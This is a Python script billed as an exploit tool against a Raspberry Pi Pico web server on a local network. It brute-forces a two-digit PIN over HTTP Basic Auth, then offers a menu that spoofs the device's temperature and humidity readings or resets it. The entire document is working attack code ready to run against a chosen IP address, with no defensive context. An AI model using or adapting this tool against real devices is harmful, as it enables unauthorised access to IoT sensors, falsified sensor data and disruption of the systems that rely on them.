import urllib.request
import urllib.error
import sys
import time
import base64

# --- Configuration ---
print("--- PICO ULTIMATE EXPLOIT TOOL ---")
target_ip = input("Enter Pico IP (e.g., 192.168.1.50): ")
username = input("Enter Username to target: ")

def test_auth(ip, user, pwd):
    """Tests a single password and returns the auth_str if successful."""
    creds = f"{user}:{pwd}"
    auth_str = base64.b64encode(creds.encode()).decode()
    headers = {
        "Authorization": f"Basic {auth_str}",
        "Connection": "close"  # Crucial for Pico stability
    }
    url = f"http://{ip}/"
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=3) as response:
            if response.status == 200:
                return auth_str
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return None # Wrong password
    except Exception:
        return "RETRY" # Pico is likely busy or timed out
    return None

# --- Phase 1: Authentication ---
found_auth = None
mode = input("Do you know the password? (y/n): ").lower()

if mode == 'y':
    pwd = input("Enter known password: ")
    print("[*] Verifying...")
    found_auth = test_auth(target_ip, username, pwd)
    if not found_auth:
        print("[-] Incorrect. Switching to Brute Force...")
        mode = 'n'

if mode == 'n':
    print(f"[*] Starting Brute Force (00-99) for '{username}'...")
    for i in range(100):
        pwd = f"{i:02d}"  # Formats as 00, 01, 02...
        sys.stdout.write(f"\r[*] Testing PIN: {pwd} ")
        sys.stdout.flush()
        
        result = test_auth(target_ip, username, pwd)
        
        if result == "RETRY":
            # Pico is overwhelmed, wait a second and try the same number again
            time.sleep(1)
            result = test_auth(target_ip, username, pwd)

        if result and result != "RETRY":
            print(f"\n[+] SUCCESS! Password found: {pwd}")
            found_auth = result
            break
        
        # Small delay to prevent the Pico's network stack from crashing
        time.sleep(0.1)

# --- Phase 2: Exploit Menu ---
if found_auth:
    headers = {"Authorization": f"Basic {found_auth}", "Connection": "close"}
    while True:
        print("\n" + "="*20)
        print(" ACCESS GRANTED ")
        print("="*20)
        print("1. SPOOF DATA (T=99.9, H=99.9)")
        print("2. CUSTOM OVERRIDE")
        print("3. RESET SYSTEM")
        print("4. EXIT")
        
        choice = input("\nSelect Option: ")
        
        path = ""
        if choice == "1":
            path = "/set_env?t=99.9&h=99.9"
        elif choice == "2":
            t = input("Enter Temp: ")
            h = input("Enter Humid: ")
            path = f"/set_env?t={t}&h={h}"
        elif choice == "3":
            path = "/reset"
        elif choice == "4":
            break
        
        if path:
            try:
                req = urllib.request.Request(f"http://{target_ip}{path}", headers=headers)
                urllib.request.urlopen(req, timeout=3)
                print("[+] Command sent successfully!")
            except Exception as e:
                print(f"[!] Command failed: {e}")
else:
    print("\n[-] Attack finished. No access gained.")